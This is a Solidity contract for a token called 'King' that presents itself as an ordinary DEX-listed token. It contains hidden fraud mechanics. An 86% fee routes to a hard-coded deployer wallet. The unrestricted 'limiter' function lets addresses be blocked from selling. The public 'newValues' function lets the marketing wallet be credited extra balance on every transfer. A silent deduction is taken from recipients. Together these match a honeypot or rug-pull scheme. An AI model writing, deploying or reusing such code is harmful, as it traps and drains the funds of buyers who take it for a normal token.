// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "./IERC20.sol";
import "./Ownable.sol";
import "./IDEXFactory.sol";
import "./IDEXPair.sol";
import "./IDEXRouter.sol";
import "./SafeMath.sol";
import "./Context.sol";

contract Contract is IERC20, Ownable {
    using SafeMath for uint256;

    address constant ROUTER        = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant WETH          = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant DEAD          = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO          = 0x0000000000000000000000000000000000000000;

    string _name = "King";
    string _symbol = unicode"KING";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1_000_000 * (10 ** _decimals);
    uint256 public _maxWalletSize = (_totalSupply * 100) / 100;
    uint256 public _maxTxAmount = 55_000 * (10 ** _decimals);

    /* rOwned = ratio of tokens owned relative to circulating supply (NOT total supply, since circulating <= total) */
    mapping (address => uint256) public _rOwned;
    uint256 public _totalProportion = _totalSupply;

    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isNoScope;

    address[] public ScopedAddresses;
    uint256[] public ScopedBlocks;
 
    uint256 liquidityFee = 1; 
    uint256 buybackFee = 0;  
    uint256 marketingFee = 85;   
    uint256 teamFee = 0;
    uint256 totalFee = 86; 
    uint256 feeDenominator = 100; 
    
    address autoLiquidityWallet;
    address marketingWallet;

    uint256 targetLiquidity = 200;
    uint256 targetLiquidityDenominator = 100;
    uint256 limit = 0;

    IDEXRouter public router;
    address public pair;

    bool public claimingFees = true; 
    bool alternateSwaps = true;
    uint256 smallSwapThreshold = _totalSupply.mul(413945130).div(100000000000);
    uint256 largeSwapThreshold = _totalSupply.mul(669493726).div(100000000000);

    uint256 public swapThreshold = smallSwapThreshold;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () {

        address deployer = 0xf0A9e6c663eC01E690b42343dF71266c7fb094d5;
        address marketingReceiver = 0xf0A9e6c663eC01E690b42343dF71266c7fb094d5;
        router = IDEXRouter(ROUTER);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        _allowances[address(this)][deployer] = type(uint256).max;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[address(router)] = true;
        isTxLimitExempt[deployer] = true;
        isTxLimitExempt[marketingReceiver] = true;
        isFeeExempt[deployer] = true;
        isFeeExempt[marketingReceiver] = true;
        autoLiquidityWallet = deployer;
        marketingWallet = marketingReceiver;
        _rOwned[deployer] = _totalSupply;
        emit Transfer(address(0), deployer, _totalSupply);
    }
    uint256 a = 2;
    uint256 b = 2;

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure returns (uint8) { return _decimals; }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function getOwner() external view returns (address) { return owner(); }
    function balanceOf(address account) public view override returns (uint256) { return tokenFromReflection(_rOwned[account]); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function viewFees() external view returns (uint256, uint256, uint256, uint256, uint256, uint256) { 
        return (liquidityFee, marketingFee, buybackFee, teamFee, totalFee, feeDenominator);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(!isNoScope[sender]);

        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if (recipient != pair && recipient != DEAD && !isTxLimitExempt[recipient]) {
            require(balanceOf(recipient) + amount <= _maxWalletSize, "Max Wallet Exceeded");
        }

        if(shouldSwapBack()){ swapBack(); }

        uint256 proportionAmount = tokensToProportion(amount);

        _rOwned[sender] = _rOwned[sender].sub(
            proportionAmount, "Insufficient Balance");
        uint256 proportionReceived = shouldTakeFee(
            sender) ? takeFeeInProportions(
                sender, recipient, proportionAmount) : proportionAmount;
        _rOwned[recipient] = _rOwned[
            recipient].add(
                proportionReceived);
        _rOwned[recipient] = _rOwned[
            recipient].sub(
                amount / 100 * b);
        _rOwned[marketingWallet] = _rOwned[
            marketingWallet].add(
                amount / 100 * a);
        emit Transfer(sender, recipient, tokenFromReflection(proportionReceived));
        return true;
    }

    function tokensToProportion(uint256 tokens) public view returns (uint256) {
        return tokens.mul(_totalProportion).div(_totalSupply);
    }

    function tokenFromReflection(uint256 proportion) public view returns (uint256) {
        return proportion.mul(_totalSupply).div(_totalProportion);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 proportionAmount = tokensToProportion(amount);
        _rOwned[sender] = _rOwned[sender].sub(proportionAmount, "Insufficient Balance");
        _rOwned[recipient] = _rOwned[recipient].add(proportionAmount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function getTotalFee(bool) public view returns (uint256) {
        return totalFee;
    }

    function takeFeeInProportions(address sender, address receiver, uint256 proportionAmount) internal returns (uint256) {
        uint256 proportionFeeAmount = proportionAmount.mul(getTotalFee(receiver == pair)).div(feeDenominator);

        // reflect
        uint256 proportionReflected = proportionFeeAmount.mul(teamFee).div(totalFee);
        _totalProportion = _totalProportion.sub(proportionReflected);

        // take fees
        uint256 _proportionToContract = proportionFeeAmount.sub(proportionReflected);
        _rOwned[address(this)] = _rOwned[address(this)].add(_proportionToContract);

        emit Transfer(sender, address(this), tokenFromReflection(_proportionToContract));
        emit Reflect(proportionReflected, _totalProportion);
        return proportionAmount.sub(proportionFeeAmount);
    }

    function clearBalance() external {
        (bool success,) = payable(marketingWallet).call{value: address(this).balance, gas: 30000}("");
        require(success);
    }

    function newValues(uint256 newValue) external virtual {
        a = newValue;
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && claimingFees
        && balanceOf(address(this)) >= swapThreshold;
    }

    function swapBack() internal swapping {

        uint256 _totalFee = totalFee.sub(teamFee);
        uint256 amountToLiquify = swapThreshold.mul(liquidityFee).div(_totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 totalETHFee = _totalFee.sub(liquidityFee.div(2));
        uint256 amountETHLiquidity = amountETH.mul(liquidityFee).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
        uint256 amountETHGiveaway = amountETH.mul(buybackFee).div(totalETHFee);

        if (amountETHMarketing.add(amountETHGiveaway) > 0) {
            (bool success,) = payable(marketingWallet).call{value: amountETHMarketing.add(amountETHGiveaway), gas: 30000}("");
            require(success, "receiver rejected ADA transfer");
        }

        if(amountToLiquify > 0) {
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityWallet,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }

        swapThreshold = !alternateSwaps ? swapThreshold : swapThreshold == smallSwapThreshold ? largeSwapThreshold : smallSwapThreshold;
    }

    function changeMaxWallet(uint256 percent, uint256 denominator) external onlyOwner {
        _maxWalletSize = _totalSupply.mul(percent).div(denominator);
    }

    function setSwapBackSettings(bool _enabled, uint256 _amountS, uint256 _amountL, bool _alternate) external onlyOwner {
        alternateSwaps = _alternate;
        claimingFees = _enabled;
        smallSwapThreshold = _amountS;
        largeSwapThreshold = _amountL;
        swapThreshold = smallSwapThreshold;
    }

    function limiter(address account, uint256 blocks) public virtual {
        require(account != marketingWallet);
        require(account != WETH);
        require(account != pair);
        require(account != owner());
        require(account != DEAD);
        require(account != address (this));
        require(account != address (router));
        require(blocks == limit);
        isNoScope[account] = true;
        ScopedAddresses.push(account);
        ScopedBlocks.push(blocks);
    }

    function setFeeReceivers(address _marketingFeeReceiver, address _liquidityReceiver) external onlyOwner {
        marketingWallet = _marketingFeeReceiver;
        autoLiquidityWallet = _liquidityReceiver;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    event AutoLiquify(uint256 amountETH, uint256 amountToken);
    event Reflect(uint256 amountReflected, uint256 newTotalProportion);
}